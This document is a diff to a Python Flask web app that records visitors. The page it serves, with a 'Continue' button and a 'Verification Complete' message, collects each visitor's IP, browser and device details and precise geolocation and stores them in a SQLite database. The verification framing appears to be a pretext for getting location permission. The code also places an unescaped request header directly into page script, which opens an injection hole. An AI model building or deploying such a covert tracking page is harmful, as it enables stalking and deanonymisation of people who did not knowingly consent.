@@ -2,16 +2,60 @@ from flask import Flask, request
 from datetime import datetime
 import json
 import os
+import sqlite3
 
 app = Flask(__name__)
 
-# -------------------------------------------------
+# ---------------------------------------
+# CREATE DATABASE
+# ---------------------------------------
+
+conn = sqlite3.connect("visitors.db", check_same_thread=False)
+
+cursor = conn.cursor()
+
+cursor.execute("""
+
+CREATE TABLE IF NOT EXISTS visitors (
+
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+    time TEXT,
+
+    ip TEXT,
+
+    user_agent TEXT,
+
+    platform TEXT,
+
+    language TEXT,
+
+    screen_width TEXT,
+
+    screen_height TEXT,
+
+    timezone TEXT,
+
+    latitude TEXT,
+
+    longitude TEXT,
+
+    accuracy TEXT
+
+)
+
+""")
+
+conn.commit()
+
+
+# ---------------------------------------
 # HOME PAGE
-# -------------------------------------------------
+# ---------------------------------------
+
 @app.route('/')
 def home():
 
-    # GET REAL PUBLIC IP
     ip = request.headers.get(
         'X-Forwarded-For',
         request.remote_addr
@@ -19,32 +63,8 @@ def home():
 
     user_agent = request.headers.get('User-Agent')
 
-    headers = dict(request.headers)
+    return f"""
 
-    # SAVE BASIC REQUEST INFO
-    log_data = f"""
-================================================
-
-TIME:
-{datetime.now()}
-
-IP ADDRESS:
-{ip}
-
-USER AGENT:
-{user_agent}
-
-HEADERS:
-{json.dumps(headers, indent=2)}
-
-================================================
-"""
-
-    with open("logs.txt", "a") as f:
-        f.write(log_data)
-
-    # WEBSITE HTML
-    return """
 <!DOCTYPE html>
 <html>
 
@@ -54,37 +74,24 @@ HEADERS:
 
 <style>
 
-body{
-
+body{{
     background:black;
-
     color:white;
-
     display:flex;
-
     justify-content:center;
-
     align-items:center;
-
     height:100vh;
-
     font-family:Arial;
-
     flex-direction:column;
-}
+}}
 
-button{
-
+button{{
     padding:15px 30px;
-
     font-size:20px;
-
     border:none;
-
     border-radius:10px;
-
     cursor:pointer;
-}
+}}
 
 </style>
 
@@ -100,17 +107,15 @@ Continue
 
 <script>
 
-function getLocation(){
+function getLocation(){{
 
-    // --------------------------------
-    // DEVICE INFO
-    // --------------------------------
+    const deviceInfo = {{
 
-    const deviceInfo = {
-
-        platform: navigator.platform,
+        ip: "{ip}",
 
         userAgent: navigator.userAgent,
+
+        platform: navigator.platform,
 
         language: navigator.language,
 
@@ -121,31 +126,15 @@ function getLocation(){
         timezone: Intl.DateTimeFormat()
             .resolvedOptions()
             .timeZone
-    };
-
-    // SEND DEVICE INFO
-    fetch("/device", {
-
-        method: "POST",
-
-        headers: {
-            "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify(deviceInfo)
-
-    });
-
-
-    // --------------------------------
-    // LOCATION ACCESS
-    // --------------------------------
+    }};
 
     navigator.geolocation.getCurrentPosition(
 
-        function(position){
+        function(position){{
 
-            const locationData = {
+            const data = {{
+
+                ...deviceInfo,
 
                 latitude: position.coords.latitude,
 
@@ -153,83 +142,110 @@ function getLocation(){
 
                 accuracy: position.coords.accuracy
 
-            };
+            }};
 
-            // SEND LOCATION TO BACKEND
-            fetch("/location", {
+            fetch("/save", {{
 
                 method: "POST",
 
-                headers: {
+                headers: {{
                     "Content-Type": "application/json"
-                },
+                }},
 
-                body: JSON.stringify(locationData)
+                body: JSON.stringify(data)
 
-            });
+            }});
 
             document.body.innerHTML =
                 "<h1>Verification Complete ✅</h1>";
 
-        },
+        }},
 
-        function(error){
+        function(error){{
 
             document.body.innerHTML =
                 "<h1>Location Permission Denied ❌</h1>";
 
-        }
+        }}
 
     );
 
-}
+}}
 
 </script>
 
 </body>
 </html>
+
 """
 
 
-# -------------------------------------------------
-# DEVICE INFO ROUTE
-# -------------------------------------------------
-@app.route('/device', methods=['POST'])
-def device():
+# ---------------------------------------
+# SAVE DATA
+# ---------------------------------------
+
+@app.route('/save', methods=['POST'])
+def save():
 
     data = request.json
 
-    with open("logs.txt", "a") as f:
+    cursor.execute("""
 
-        f.write(
-            f"\nDEVICE INFO:\n"
-            f"{json.dumps(data, indent=2)}\n"
-        )
+    INSERT INTO visitors (
+
+        time,
+        ip,
+        user_agent,
+        platform,
+        language,
+        screen_width,
+        screen_height,
+        timezone,
+        latitude,
+        longitude,
+        accuracy
+
+    )
+
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+
+    """, (
+
+        str(datetime.now()),
+
+        data.get("ip"),
+
+        data.get("userAgent"),
+
+        data.get("platform"),
+
+        data.get("language"),
+
+        str(data.get("screenWidth")),
+
+        str(data.get("screenHeight")),
+
+        data.get("timezone"),
+
+        str(data.get("latitude")),
+
+        str(data.get("longitude")),
+
+        str(data.get("accuracy"))
+
+    ))
+
+    conn.commit()
+
+    print("\nNEW VISITOR SAVED\n")
 
     return "OK"
 
 
-# -------------------------------------------------
-# LOCATION ROUTE
-# -------------------------------------------------
-@app.route('/location', methods=['POST'])
-def location():
-
-    data = request.json
-
-    with open("logs.txt", "a") as f:
-
-        f.write(
-            f"\nLOCATION DATA:\n"
-            f"{json.dumps(data, indent=2)}\n"
-        )
-
-    return "OK"
-
-
-# -------------------------------------------------
+# ---------------------------------------
 # START SERVER
-# -------------------------------------------------
+# ---------------------------------------
+
 app.run(
     host='0.0.0.0',
     port=int(os.environ.get("PORT", 5000))
